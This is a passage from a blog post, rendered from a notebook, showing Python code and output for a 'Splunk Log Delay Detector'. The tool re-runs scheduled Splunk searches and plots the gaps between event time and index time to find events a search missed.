font-style: inherit;">'        _time=</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,_indextime=</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,_raw=</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(formatted_time,formatted_indextime,key[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>]))</span>
<span id="cb1-107">                    </span>
<span id="cb1-108">                    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#graph the results    </span></span>
<span id="cb1-109">                    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> graph <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'true'</span>:     </span>
<span id="cb1-110">                        plot_timeline(search_issue,results_indexed,results_time)</span>
<span id="cb1-111">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-112">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">else</span>:</span>
<span id="cb1-113">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'SEARCH: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> SID: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'label'</span>],job[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'content'</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sid'</span>]))</span>
<span id="cb1-114">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'RESULT: NO DELAY FOUND'</span>)</span>
<span id="cb1-115">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'NOTE: Search results in original search and re-ran search match, no delay issue identified.'</span>)</span>
<span id="cb1-116">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-117"> </span>
<span id="cb1-118"></span>
<span id="cb1-119"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Function to plot the timeline of the search issue</span></span>
<span id="cb1-120"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> plot_timeline(search_issue, results_indexed, results_time):</span>
<span id="cb1-121">    </span>
<span id="cb1-122">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Convert result issue timestamps to datetime objects</span></span>
<span id="cb1-123">    indextimes <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> [datetime.strptime(d, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> %H:%M:%S'</span>) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> d <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results_indexed]</span>
<span id="cb1-124">    times <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> [datetime.strptime(d, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> %H:%M:%S'</span>) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> d <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> results_time]</span>
<span id="cb1-125">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Set the title and subtitle for the plot</span></span>
<span id="cb1-126">    title <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> search_issue[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'label'</span>]</span>
<span id="cb1-127">    subtitle <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> search_issue[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sid'</span>]</span>
<span id="cb1-128">    </span>
<span id="cb1-129">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Get the start and end dates of the search issue and remove timezone and microseconds</span></span>
<span id="cb1-130">    start_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> datetime.strptime(search_issue[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'earliest_time'</span>], <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">T%H:%M:%S.</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%f</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">%z'</span>)</span>
<span id="cb1-131">    start_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> start_date.replace(microsecond<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, tzinfo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>)</span>
<span id="cb1-132">    end_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> datetime.strptime(search_issue[<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>][<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'latest_time'</span>], <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%Y-%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">T%H:%M:%S.</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%f</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">%z'</span>)</span>
<span id="cb1-133">    end_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> end_date.replace(microsecond<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, tzinfo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>)</span>
<span id="cb1-134"></span>
<span id="cb1-135">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Create a figure and axis for the plot</span></span>
<span id="cb1-136">    fig, ax <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> plt.subplots(figsize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">6</span>))</span>
<span id="cb1-137"></span>
<span id="cb1-138">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Plot the base timeline</span></span>
<span id="cb1-139">    ax.plot([start_date, end_date], [<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>], color<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'black'</span>, alpha<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.5</span>)</span>
<span id="cb1-140">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Fill the area between the start and end dates</span></span>
<span id="cb1-141">    ax.fill_between([start_date, end_date], <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.5</span>, <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.5</span>, color<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'green'</span>, alpha<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.2</span>)</span>
<span id="cb1-142"></span>
<span id="cb1-143">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Calculate the maximum difference between indextime and start_time</span></span>
<span id="cb1-144">    max_difference <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">max</span>([<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">abs</span>((date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> start_date).total_seconds()) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> date <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> indextimes] <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span></span>
<span id="cb1-145">                         [<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">abs</span>((date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> end_date).total_seconds()) <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> date <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> indextimes])</span>
<span id="cb1-146">    </span>
<span id="cb1-147">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Set the buffer based on the maximum difference</span></span>
<span id="cb1-148">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">buffer</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> timedelta(seconds<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>max_difference <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span>)</span>
<span id="cb1-149"></span>
<span id="cb1-150">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Set the x and y limits for the plot</span></span>
<span id="cb1-151">    ax.set_xlim(start_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">buffer</span>, end_date <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">buffer</span>)</span>
<span id="cb1-152">    ax.set_ylim(<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.5</span>, <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.5</span>)</span>
<span id="cb1-153"></span>
<span id="cb1-154">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Remove spines and y-axis</span></span>
<span id="cb1-155">    ax.spines[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'left'</span>].set_visible(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb1-156">    ax.spines[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'right'</span>].set_visible(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb1-157">    ax.spines[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'top'</span>].set_visible(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb1-158">    ax.yaxis.set_visible(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span>)</span>
<span id="cb1-159"></span>
<span id="cb1-160">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Plot the indexed markers and annotations</span></span>
<span id="cb1-161">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> idx, date <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">enumerate</span>(indextimes):</span>
<span id="cb1-162">        ax.plot(date, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ro'</span>, markersize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span>, label<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Indexed Time for Event'</span>)</span>
<span id="cb1-163">        ax.annotate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> - </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(idx,date.strftime(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-%Y %H:%M:%S'</span>)), xy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>(date, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>), xytext<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>(date, <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> (idx <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span>),</span>
<span id="cb1-164">                arrowprops<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">dict</span>(arrowstyle<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-&gt;'</span>, lw<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.5</span>),</span>
<span id="cb1-165">                fontsize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span>, ha<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'center'</span>)</span>
<span id="cb1-166">        </span>
<span id="cb1-167">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#plot the time markers and annotations</span></span>
<span id="cb1-168">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> idx, date <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">enumerate</span>(times):</span>
<span id="cb1-169">        ax.plot(date, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'bo'</span>, markersize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span>, label<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Time for Event'</span>)</span>
<span id="cb1-170">        ax.annotate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> - </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(idx,date.strftime(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-%Y %H:%M:%S'</span>)), xy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>(date, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>), xytext<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>(date, <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> (idx <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">0.1</span>),</span>
<span id="cb1-171">                arrowprops<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">dict</span>(arrowstyle<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-&gt;'</span>, lw<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.5</span>),</span>
<span id="cb1-172">                fontsize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span>, ha<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'center'</span>)</span>
<span id="cb1-173"></span>
<span id="cb1-174">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Set the title, x-axis formatter, and x-axis locator</span></span>
<span id="cb1-175">    ax.set_title(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">format</span>(title,subtitle), fontsize<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">16</span>, fontweight<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'bold'</span>)</span>
<span id="cb1-176">    ax.xaxis.set_major_formatter(mdates.DateFormatter(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%m-</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-%Y %H:%M:%S'</span>))</span>
<span id="cb1-177">    ax.xaxis.set_major_locator(mdates.AutoDateLocator())</span>
<span id="cb1-178"></span>
<span id="cb1-179">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Create the legend and display unique items</span></span>
<span id="cb1-180">    handles, labels <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> ax.get_legend_handles_labels()</span>
<span id="cb1-181">    by_label <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">dict</span>(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">zip</span>(labels, handles))</span>
<span id="cb1-182">    ax.legend(by_label.values(), by_label.keys(), loc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'upper left'</span>)</span>
<span id="cb1-183">    </span>
<span id="cb1-184">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Adjust layout and display the plot</span></span>
<span id="cb1-185">    plt.tight_layout()</span>
<span id="cb1-186">    plt.show()</span>
<span id="cb1-187"></span>
<span id="cb1-188"></span>
<span id="cb1-189"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> banner():</span>
<span id="cb1-190">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-191">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-192">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' _____  _____       _____  _   _   _____  _____ _____ _____ _____ _____ _____ _    _ _____'</span>)</span>
<span id="cb1-193">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' |    \ |____ |     |___|   \_/    |    \ |____   |   |____ |       |     |    \  /  |____'</span>)</span>
<span id="cb1-194">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' |____/ |____ |____ |   |    |     |____/ |____   |   |____ |_____  |   __|__   \/   |____'</span>)</span>
<span id="cb1-195">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'                                 Splunk Log Delay Detector                            v1.0'</span>)</span>
<span id="cb1-196">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-197">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">90</span>)</span>
<span id="cb1-198">    </span>
<span id="cb1-199">    </span>
<span id="cb1-200"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">def</span> main():</span>
<span id="cb1-201">    </span>
<span id="cb1-202">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#get config</span></span>
<span id="cb1-203">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">with</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">open</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'config.json'</span>) <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> f:</span>
<span id="cb1-204">        data <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> json.load(f)</span>
<span id="cb1-205">        splunk_account <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'splunk_account'</span>]</span>
<span id="cb1-206">        splunk_password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'splunk_password'</span>]</span>
<span id="cb1-207">        base_url <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'base_url'</span>]</span>
<span id="cb1-208">        port <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'port'</span>]</span>
<span id="cb1-209">        owner <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'owner'</span>]</span>
<span id="cb1-210">        graph <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> data[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'graph'</span>]</span>
<span id="cb1-211">  </span>
<span id="cb1-212">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#show banner</span></span>
<span id="cb1-213">    banner()</span>
<span id="cb1-214">  </span>
<span id="cb1-215">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#connect to splunk</span></span>
<span id="cb1-216">    service <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> splunk_connect(base_url, port, splunk_account, splunk_password)</span>
<span id="cb1-217">    </span>
<span id="cb1-218">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#check and compare all jobs by owner</span></span>
<span id="cb1-219">    compare_jobs(service,owner,graph) </span>
<span id="cb1-220">    </span>
<span id="cb1-221">    </span>
<span id="cb1-222"><span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">__name__</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__main__"</span>:</span>
<span id="cb1-223">    main()</span></code></pre></div>
<div class="cell-output cell-output-stdout">
<pre><code>------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
 _____  _____       _____  _   _   _____  _____ _____ _____ _____ _____ _____ _    _ _____
 |    \ |____ |     |___|   \_/    |    \ |____   |   |____ |       |     |    \  /  |____
 |____/ |____ |____ |   |    |     |____/ |____   |   |____ |_____  |   __|__   \/   |____
                                 Splunk Log Delay Detector                            v1.0
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
Connected to Splunk instance: 192.168.42.138
------------------------------------------------------------------------------------------
SEARCH: indextime_demo SID: scheduler__splunk__search__RMD51aafb4f9eda25a49_at_1680733200_806
RESULT: DIFFERENCE FOUND
NOTE: This is indicative of a delay issue and resulted in missing events in the original search.
----------
List of Missing Results
----------
        _time=2023-04-05 22:19:59,_indextime=2023-04-05 22:20:02,_raw=critical ransomware L0OdbQcw6y
        _time=2023-04-05 22:19:57,_indextime=2023-04-05 22:20:00,_raw=critical ransomware 3X1K0CTmxE</code></pre>
</div>
<div class="cell-output cell-output-display">
<p><img src="https://www.blue-prints.blog/content/blog/posts/splunk/splunklogdelay_files/figure-html/cell-2-output-2.png" class="img-fluid"></p>
</div>
<div class="cell-output cell-output-stdout">
<pre><code>------------------------------------------------------------------------------------------
SEARCH: indextime_demo SID: scheduler__splunk__search__RMD51aafb4f9eda25a49_at_1680566280_768
RESULT: NO DELAY FOUND
NOTE: Search results in original search and re-ran search match, no delay issue identified.
------------------------------------------------------------------------------------------</code></pre>
</div>
</div>
</section>
<section id="a-solution" class="level3">
